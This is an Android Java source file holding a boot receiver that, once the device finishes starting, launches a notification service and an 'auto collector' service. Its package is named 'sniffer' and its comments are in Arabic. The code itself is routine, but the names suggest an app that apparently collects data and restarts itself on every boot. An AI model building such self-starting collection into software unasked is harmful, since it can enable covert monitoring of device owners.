package com.v8.global.sniffer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            // تشغيل خدمات الإشعارات
            Intent notificationIntent = new Intent(context, NotificationService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(notificationIntent);
            } else {
                context.startService(notificationIntent);
            }
            
            // تشغيل خدمة السحب التلقائي
            Intent collectorIntent = new Intent(context, AutoCollectorService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(collectorIntent);
            } else {
                context.startService(collectorIntent);
            }
        }
    }
}
